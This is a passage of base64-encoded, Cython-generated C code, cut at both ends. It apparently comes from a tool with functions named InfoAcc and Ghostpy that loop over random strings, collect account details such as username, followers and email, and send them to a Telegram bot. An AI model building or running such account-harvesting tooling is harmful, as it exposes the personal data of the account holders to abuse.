1X0hUTUwpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzg0LCBfX3B5eF9MMzVfZXJyb3IpCgogICAgICAKICAgICAgX19weXhfdF8zID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzg3LCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzE5ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kdW1wcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAzODcsIF9fcHl4X0wzNV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19weXhfdF81ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xOSkpKSB7CiAgICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xOSk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMyk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE5KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTksIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF81ID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X3Zfa2V5Ym9hcmR9OwogICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzg3LCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgIH0KICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcGx5X21hcmt1cCwgX19weXhfdF8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4NCwgX19weXhfTDM1X2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgICAgIAogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3LCBQeV9UcnVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4NCwgX19weXhfTDM1X2Vycm9yKQogICAgICBfX3B5eF90XzUgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzExKSkpIHsKICAgICAgICBfX3B5eF90XzEwID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMSk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTApOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzUgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDEgOiAwKV0gPSB7X19weXhfdF8xMCwgX19weXhfdF8xMn07CiAgICAgICAgX19weXhfdF8xID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzgyLCBfX3B5eF9MMzVfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGFyYW1zLCBfX3B5eF90XzIsIF9fcHl4X3RfMSwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzODIsIF9fcHl4X0wzNV9lcnJvcikKICAgICAgICBfX3B5eF90XzE0ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8xKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDM4MiwgX19weXhfTDM1X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgfQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgIGdvdG8gX19weXhfTDQwX3RyeV9lbmQ7CiAgICBfX3B5eF9MMzVfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKCiAgICAKICAgIF9fcHl4X3RfMjAgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICBpZiAoX19weXhfdF8yMCkgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xNCwgJl9fcHl4X3RfMTEsICZfX3B5eF90XzEpIDwgMCkgX19QWVhfRVJSKDAsIDM5MCwgX19weXhfTDM3X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfMTE7CiAgICAgICB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfMTIgPSBOVUxMOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICAgICAgICBfX3B5eF90XzEwID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICAgICAgX19weXhfdF81ID0gMTsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9UZWxlZ3JhbV9tZXNzYWdlX2NvdWxkX25vdF9iZV9zZSwgX19weXhfdl9lfTsKICAgICAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDMtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzOTEsIF9fcHl4X0w0Nl9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgfQoKICAgICAgCiAgICAgICB7CiAgICAgICAgewogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICBnb3RvIF9fcHl4X0w0NzsKICAgICAgICB9CiAgICAgICAgX19weXhfTDQ2X2Vycm9yOjsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgICBfX3B5eF90XzcgPSAwOyBfX3B5eF90XzE2ID0gMDsgX19weXhfdF8yMyA9IDA7IF9fcHl4X3RfMjQgPSAwOyBfX3B5eF90XzI1ID0gMDsgX19weXhfdF8yNiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8yNCwgJl9fcHl4X3RfMjUsICZfX3B5eF90XzI2KTsKICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzcsICZfX3B5eF90XzE2LCAmX19weXhfdF8yMykgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfNywgJl9fcHl4X3RfMTYsICZfX3B5eF90XzIzKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjMpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzI0KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yNSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjYpOwogICAgICAgICAgX19weXhfdF8yMCA9IF9fcHl4X2xpbmVubzsgX19weXhfdF8yMSA9IF9fcHl4X2NsaW5lbm87IF9fcHl4X3RfMjIgPSBfX3B5eF9maWxlbmFtZTsKICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI0KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjUpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yNik7CiAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzI0LCBfX3B5eF90XzI1LCBfX3B5eF90XzI2KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjMpOwogICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzcsIF9fcHl4X3RfMTYsIF9fcHl4X3RfMjMpOwogICAgICAgICAgX19weXhfdF83ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMjMgPSAwOyBfX3B5eF90XzI0ID0gMDsgX19weXhfdF8yNSA9IDA7IF9fcHl4X3RfMjYgPSAwOwogICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8yMDsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMjE7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8yMjsKICAgICAgICAgIGdvdG8gX19weXhfTDM3X2V4Y2VwdF9lcnJvcjsKICAgICAgICB9CiAgICAgICAgX19weXhfTDQ3OjsKICAgICAgfQogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgZ290byBfX3B5eF9MMzZfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CiAgICBnb3RvIF9fcHl4X0wzN19leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MMzdfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzYsIF9fcHl4X3RfMTUsIF9fcHl4X3RfOCk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDM2X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzYsIF9fcHl4X3RfMTUsIF9fcHl4X3RfOCk7CiAgICBfX3B5eF9MNDBfdHJ5X2VuZDo7CiAgfQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygiYXcuSW5mb0FjYyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYWNjb3VudF9pbmZvKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXNlcl9pZCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJfaWRfaW50KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVnX2RhdGUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9mb2xsb3dlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9mb2xsb3dpbmcpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9pbmZvX3RleHQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9mKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3Zfa2V5Ym9hcmQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfMTdHaG9zdHB5KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMmF3XzE3R2hvc3RweSA9IHsiR2hvc3RweSIsIChQeUNGdW5jdGlvbilfX3B5eF9wd18yYXdfMTdHaG9zdHB5LCBNRVRIX05PQVJHUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmF3XzE3R2hvc3RweShQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKSB7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJHaG9zdHB5ICh3cmFwcGVyKSIsIDApOwogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgX19weXhfciA9IF9fcHl4X3BmXzJhd18xNkdob3N0cHkoX19weXhfc2VsZik7CgogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd18xNkdob3N0cHkoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZikgewogIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9hY2NvdW50ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZm9sbG93ZXJzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9lbWFpbCA9IE5VTEw7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF84OwogIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTI7CiAgaW50IF9fcHl4X3RfMTM7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiR2hvc3RweSIsIDApOwoKICAKICB3aGlsZSAoMSkgewoKICAgIAogICAgX19weXhfdF8xID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzk3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hc2NpaV9sZXR0ZXJzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzk3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0cmluZyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDM5NywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGlnaXRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzk3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX3B5eF90XzQgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzOTcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19weXhfdF84ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICBfX3B5eF90XzMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICBhc3NlcnQoX19weXhfdF8zKTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzggPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAxIDogMCldID0ge19fcHl4X3RfMywgX19weXhfdF80fTsKICAgICAgX19weXhfdF83ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzk3LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl